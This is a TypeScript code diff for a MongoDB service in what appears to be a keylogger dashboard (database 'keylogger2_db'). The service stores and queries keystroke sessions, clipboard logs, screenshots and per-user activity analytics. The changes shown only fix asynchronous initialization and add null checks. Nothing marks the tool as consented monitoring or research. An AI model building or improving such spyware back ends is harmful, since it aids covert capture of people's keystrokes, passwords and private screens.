@@ -8,13 +8,22 @@ const DB_NAME = "keylogger2_db";
 class MongoDBService {
   private client: MongoClient;
   private db: any;
-  private logsCollection: Collection;
-  private screenshotsCollection: Collection;
-  private clipboardCollection: Collection;
+  private logsCollection: Collection | null = null;
+  private screenshotsCollection: Collection | null = null;
+  private clipboardCollection: Collection | null = null;
+  private isInitialized: boolean = false;
+  private initPromise: Promise<void>;
   
   constructor() {
     this.client = new MongoClient(MONGO_URI);
-    this.initialize();
+    this.initPromise = this.initialize();
+  }
+  
+  // Wait for initialization to complete before making any database calls
+  private async ensureInitialized() {
+    if (!this.isInitialized) {
+      await this.initPromise;
+    }
   }
   
   private async initialize() {
@@ -32,6 +41,7 @@ class MongoDBService {
       await this.screenshotsCollection.createIndex({ user: 1, timestamp: 1 });
       await this.clipboardCollection.createIndex({ user: 1, timestamp: 1 });
       
+      this.isInitialized = true;
       console.log("Connected to MongoDB");
     } catch (error) {
       console.error("Failed to connect to MongoDB:", error);
@@ -71,6 +81,9 @@ class MongoDBService {
   // Get keystroke sessions
   async getKeystrokeSessions() {
     try {
+      await this.ensureInitialized();
+      if (!this.logsCollection) throw new Error("Logs collection is not initialized");
+      
       const docs = await this.logsCollection.find().sort({ timestamp: 1 }).toArray();
       const sessions = this.groupKeystrokeSessions(docs);
       sessions.reverse();
@@ -114,6 +127,9 @@ class MongoDBService {
   // Get clipboard logs
   async getClipboardLogs() {
     try {
+      await this.ensureInitialized();
+      if (!this.clipboardCollection) throw new Error("Clipboard collection is not initialized");
+      
       const docs = await this.clipboardCollection.find().sort({ timestamp: -1 }).toArray();
       
       return docs.map(doc => ({
@@ -134,6 +150,9 @@ class MongoDBService {
   // Get screenshot logs
   async getScreenshotLogs() {
     try {
+      await this.ensureInitialized();
+      if (!this.screenshotsCollection) throw new Error("Screenshots collection is not initialized");
+      
       const docs = await this.screenshotsCollection.find().sort({ timestamp: -1 }).toArray();
       
       return docs.map(doc => ({
@@ -156,6 +175,10 @@ class MongoDBService {
   // Get a single screenshot by ID
   async getScreenshotById(id: string) {
     try {
+      await this.ensureInitialized();
+      if (!this.screenshotsCollection) throw new Error("Screenshots collection is not initialized");
+      
+      console.log("Looking for screenshot with ID:", id);
       const doc = await this.screenshotsCollection.findOne({ _id: new ObjectId(id) });
       if (!doc) return null;
       
@@ -194,6 +217,11 @@ class MongoDBService {
   // Get analytics data
   async getAnalytics() {
     try {
+      await this.ensureInitialized();
+      if (!this.logsCollection || !this.screenshotsCollection || !this.clipboardCollection) {
+        throw new Error("Collections not initialized");
+      }
+      
       const activeUsers = await this.logsCollection.distinct("user");
       const keystrokeCount = await this.logsCollection.countDocuments();
       const screenshotCount = await this.screenshotsCollection.countDocuments();
@@ -270,6 +298,11 @@ class MongoDBService {
   // Get activity over time for charts
   async getActivityOverTime(days = 7) {
     try {
+      await this.ensureInitialized();
+      if (!this.logsCollection || !this.screenshotsCollection || !this.clipboardCollection) {
+        throw new Error("Collections not initialized");
+      }
+      
       const startDate = new Date();
       startDate.setDate(startDate.getDate() - days);
       
